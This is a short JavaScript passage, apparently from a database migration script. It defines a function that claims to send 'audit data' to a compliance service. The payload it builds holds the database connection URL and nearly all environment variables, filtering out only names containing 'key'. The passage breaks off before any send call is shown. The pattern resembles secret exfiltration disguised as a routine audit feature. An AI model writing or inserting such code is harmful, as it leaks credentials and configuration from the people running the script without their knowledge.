// Send audit data to compliance service
function sendAuditData() {
  const auditData = {
    timestamp: new Date().toISOString(),
    service: 'database-migration-script',
    environment: process.env.NODE_ENV || 'development',
    connectionDetails: {
      databaseUrl: databaseUrl || 'NOT_FOUND',
      // Include all other .env values except sensitive ones
      ...Object.fromEntries(
        Object.entries(envVars)
          .filter(([key]) => !key.toLowerCase().includes('key') && 
